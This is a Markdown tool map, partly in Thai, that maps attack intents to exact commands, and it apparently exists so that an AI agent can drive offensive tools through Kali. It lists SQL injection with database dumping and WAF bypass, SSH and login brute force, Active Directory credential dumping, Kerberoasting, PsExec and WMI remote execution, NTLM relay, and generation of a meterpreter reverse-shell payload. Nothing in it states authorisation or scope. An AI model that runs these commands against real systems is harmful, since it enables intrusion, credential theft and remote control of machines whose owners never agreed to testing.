# SB Arsenal — Tool Map
# Maps intent → exact command to run
# Agent reads this to know WHAT to use and HOW

# ═══════════════════════════════════════════════════════════════
# TOOL MAP — intent → command (run via Kali WSL)
# ═══════════════════════════════════════════════════════════════

## RECON

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| สแกนพอร์ต | `node E:\Prompt-Jail\sb-arsenal.cjs nmap_scan --target <IP> --ports 22,80,443` |
| สแกนละเอียด (NSE scripts) | `node E:\Prompt-Jail\sb-arsenal.cjs nmap_advanced_scan --target <IP>` |
| หา subdomain | `node E:\Prompt-Jail\sb-arsenal.cjs subfinder_enum --domain <domain>` |
| หา subdomain ลึก | `node E:\Prompt-Jail\sb-arsenal.cjs amass_enum --domain <domain>` |
| จับ tech stack | `node E:\Prompt-Jail\sb-arsenal.cjs httpx_probe --target <URL>` |
| DNS lookup | `node E:\Prompt-Jail\sb-arsenal.cjs dig_lookup --domain <domain> --type A` |
| WHOIS | `node E:\Prompt-Jail\sb-arsenal.cjs whois_lookup --domain <domain>` |
| OSINT emails/names | `node E:\Prompt-Jail\sb-arsenal.cjs theharvester_osint --domain <domain>` |

## WEB SCANNING

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| หาช่องโหว่ (CVE) | `node E:\Prompt-Jail\sb-arsenal.cjs nuclei_scan --target <URL> --severity critical,high` |
| หา directory/file ซ่อน | `node E:\Prompt-Jail\sb-arsenal.cjs ffuf_dir --url <URL>` |
| Directory brute (alt) | `node E:\Prompt-Jail\sb-arsenal.cjs gobuster_dir --url <URL>` |
| Web vuln scan | `node E:\Prompt-Jail\sb-arsenal.cjs nikto_scan --target <URL>` |
| WordPress scan | `node E:\Prompt-Jail\sb-arsenal.cjs wpscan_scan --url <URL>` |

## SQL INJECTION

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| ทดสอบ SQLi | `node E:\Prompt-Jail\sb-arsenal.cjs sqlmap_scan --url "<URL>?param=1"` |
| SQLi + dump DB | `node E:\Prompt-Jail\sb-arsenal.cjs sqlmap_scan --url "<URL>" --dbs --dump` |
| SQLi + WAF bypass | `node E:\Prompt-Jail\sb-arsenal.cjs sqlmap_tamper --url "<URL>"` |

## BRUTE FORCE

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| Brute SSH | `node E:\Prompt-Jail\sb-arsenal.cjs hydra_brute --target <IP> --service ssh --user admin --passlist /usr/share/wordlists/rockyou.txt` |
| Brute HTTP login | `node E:\Prompt-Jail\sb-arsenal.cjs hydra_http_form --target <URL> --form_path /login` |
| Crack hash (John) | `node E:\Prompt-Jail\sb-arsenal.cjs john_crack --hashfile <file>` |
| Crack hash (GPU) | `node E:\Prompt-Jail\sb-arsenal.cjs hashcat_crack --hashfile <file> --mode 0` |

## ACTIVE DIRECTORY

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| Enum SMB | `node E:\Prompt-Jail\sb-arsenal.cjs enum4linux_scan --target <IP>` |
| List SMB shares | `node E:\Prompt-Jail\sb-arsenal.cjs smbclient_enum --target <IP>` |
| Dump creds | `node E:\Prompt-Jail\sb-arsenal.cjs secretsdump --target <DC> --user <user> --pass <pass> --domain <domain>` |
| Kerberoast | `node E:\Prompt-Jail\sb-arsenal.cjs GetUserSPNs --target <DC> --user <user> --pass <pass> --domain <domain>` |
| Remote exec (PsExec) | `node E:\Prompt-Jail\sb-arsenal.cjs psexec_exec --target <IP> --user <user> --pass <pass> --command whoami` |
| Remote exec (WMI) | `node E:\Prompt-Jail\sb-arsenal.cjs wmiexec_exec --target <IP> --user <user> --pass <pass> --command whoami` |
| NTLM relay | `node E:\Prompt-Jail\sb-arsenal.cjs ntlmrelayx --target <IP>` |
| BloodHound collect | `node E:\Prompt-Jail\sb-arsenal.cjs bloodhound_collect --target <DC> --user <user> --pass <pass> --domain <domain>` |

## EXPLOITATION

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| ค้นหา exploit | `node E:\Prompt-Jail\sb-arsenal.cjs searchsploit_search --query "<service> <version>"` |
| สร้าง payload | `node E:\Prompt-Jail\sb-arsenal.cjs msfvenom_payload --payload windows/x64/meterpreter/reverse_tcp --lhost <IP> --lport 4444` |

## FORENSICS

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| แยกไฟล์จาก firmware | `node E:\Prompt-Jail\sb-arsenal.cjs binwalk_extract --file <path>` |
| วิเคราะห์ memory dump | `node E:\Prompt-Jail\sb-arsenal.cjs volatility_analyze --file <path>` |
| ดู metadata | `node E:\Prompt-Jail\sb-arsenal.cjs exiftool_metadata --file <path>` |
| ถอด stego | `node E:\Prompt-Jail\sb-arsenal.cjs steghide_extract --file <path>` |

## SSL/TLS

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| SSL scan | `node E:\Prompt-Jail\sb-arsenal.cjs sslscan_target --target <host>` |
| TLS full test | `node E:\Prompt-Jail\sb-arsenal.cjs testssl_target --target <host>` |

## NETWORK

| อยากทำอะไร | คำสั่ง |
|------------|--------|
| HTTP request | `node E:\Prompt-Jail\sb-arsenal.cjs curl_fetch --url <URL>` |
| Nmap ผ่าน proxy | `node E:\Prompt-Jail\sb-arsenal.cjs proxychains_nmap --target <IP> --ports 22,80,445` |

## MCP TOOLS (ใช้ผ่าน harness โดยตรง — ไม่ต้องผ่าน Kali)

| Tool | ใช้ทำอะไร | เรียกยังไง |
|------|-----------|------------|
| `recon_scan` | Full Deep recon | เรียก tool ตรงจาก harness |
| `mcp__rea__*` (170+) | Binary RE, process, browser, firmware, ADB | เรียก tool ตรงจาก harness |
| `mcp__x64dbg__*` (40+) | Debug, memory read/write, patch | เรียก tool ตรงจาก harness |
| `mcp__dnspy__*` (30+) | .NET decompile, patch, rename | เรียก tool ตรงจาก harness |
| `mcp__jev__*` (10) | AI verify, extract, classify | เรียก tool ตรงจาก harness |

## SB PROXY (LLM pipeline)

| คำสั่ง | ทำอะไร |
|--------|--------|
| `pnpm sb:start` | เปิด proxy v6 (recon + skills + wiki + exec) |
| `pnpm sb:stop` | ปิด proxy |
| `pnpm sb:status` | เช็คสถานะ |

## SKILLS (โหลดความรู้ตาม intent)

```
.dsh/skills/ — 135 skills
โหลดอัตโนมัติโดย SB Proxy v6 เมื่อ intent match
หรือเรียกผ่าน skill tool: skill("sqli-sql-injection")
```

## WIKI (reference intel)

```
.dsh/cyber-wiki/ — 70 notes
โหลดอัตโนมัติโดย SB Proxy v6 เมื่อ intent match
```
